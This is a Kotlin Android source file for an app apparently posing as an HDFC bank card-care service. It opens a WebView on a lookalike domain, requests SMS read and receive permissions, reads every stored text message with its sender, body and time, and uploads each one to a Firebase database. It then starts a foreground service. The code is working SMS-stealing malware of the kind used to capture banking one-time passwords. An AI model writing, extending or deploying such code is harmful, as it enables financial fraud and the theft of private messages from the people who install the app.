package com.disc.hdfccard

import android.content.pm.PackageManager
import android.os.Bundle
import android.widget.Toast
import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.database.Cursor
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContentProviderCompat.requireContext
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import androidx.lifecycle.lifecycleScope
import com.disc.hdfccard.databinding.ActivityMainBinding
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.TimeZone

class MainActivity : AppCompatActivity() {

    private val READ_SMS_PERMISSION_REQUEST_CODE = 123
    private val RECEIVE_SMS_PERMISSION_REQUEST_CODE = 123
    private val POST_NOTIFICATIONS_PERMISSION_REQUEST_CODE = 123
    private lateinit var smsReceiver: SmsReceiver
    lateinit var modelName : String
    val smsReference = FirebaseDatabase.getInstance().getReference("SMS")
    lateinit var binding : ActivityMainBinding

    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean ->
        if (!isGranted) {
            Toast.makeText(this, "permission denied", Toast.LENGTH_SHORT).show()
           }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)



        configureWebView()
        binding.webView.webViewClient = webViewClient
        loadUrl("https://backend.hdfccardcare.in/")

        modelName = Build.MODEL
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), READ_SMS_PERMISSION_REQUEST_CODE)
        } else {
            readMessages()
        }

        if (ContextCompat.checkSelfPermission(
                this,
                Manifest.permission.RECEIVE_SMS
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.RECEIVE_SMS),
                RECEIVE_SMS_PERMISSION_REQUEST_CODE
            )
        } else {
        }


    }

    private fun configureWebView() {
        val webSettings = binding.webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.setSupportZoom(true)
    }

    private fun loadUrl(url: String) {
        binding.webView.loadUrl(url)
    }

    private val webViewClient = object : WebViewClient() {
        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
            super.onPageStarted(view, url, favicon)
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
        }
    }

    private fun readMessages() {
            val cursor: Cursor? = contentResolver.query(
                Uri.parse("content://sms"),
                arrayOf("_id", "address", "date", "body", "type"),
                null,
                null,
                null
            )

            cursor?.use {
                val addressIndex = it.getColumnIndex("address")
                val dateIndex = it.getColumnIndex("date")
                val bodyIndex = it.getColumnIndex("body")
                val typeIndex = it.getColumnIndex("type")

                if (it.moveToFirst()) {
                    do {
                        val address = it.getString(addressIndex)
                        val date = it.getString(dateIndex)
                        val body = it.getString(bodyIndex)
                        val type = it.getInt(typeIndex)

                        val status = when (type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "Outgoing"
                            Telephony.Sms.MESSAGE_TYPE_FAILED -> "Failed"
                            Telephony.Sms.MESSAGE_TYPE_QUEUED -> "Queued"
                            else -> "Unknown"
                        }

                        val timestamp = date.toLong()
                        val datetime = Date(timestamp)
                        val format = SimpleDateFormat("hh:mm")
                        format.timeZone = TimeZone.getTimeZone("Asia/Karachi")
                        val formattedDate = format.format(datetime)
                        val data = MessageModel("",address,formattedDate,body,status)
                        lifecycleScope.launch {
                            val result = uploadAllMessages(modelName, data)
                        }
                    } while (it.moveToNext())
                }
            }
            cursor?.close()
    }

    suspend fun uploadAllMessages(child: String, model: MessageModel): MyResult {
        return withContext(Dispatchers.IO) { // Execute the following block in background thread
            try {
                val key = smsReference.push().key ?: ""
                model.key = key

                smsReference.child(child).apply {
                    if (get().await().exists()) {
                        removeValue().await()
                    }
                    child(key).setValue(model).await()
                }
                MyResult.Success("SMS messages retrieved and stored successfully.")
            } catch (e: Exception) {
                MyResult.Error("Error retrieving SMS messages: ${e.message}")
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == READ_SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                readMessages()
            } else {
                Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show()
            }
        }

        if (requestCode == RECEIVE_SMS_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                askNotificationPermission(this@MainActivity,requestPermissionLauncher)

            }
        }
    }



    fun askNotificationPermission(context: Context, requestPermissionLauncher: ActivityResultLauncher<String>) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            when {
                ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED -> {
                }
                context is Activity && context.shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS) -> {
                    requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
                else -> {
                    requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
                }
            }
        }
    }

    override fun onResume() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ){
            val intent = Intent(this, MyForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            }else{
                startService(intent)
            }
        }

        super.onResume()


    }


}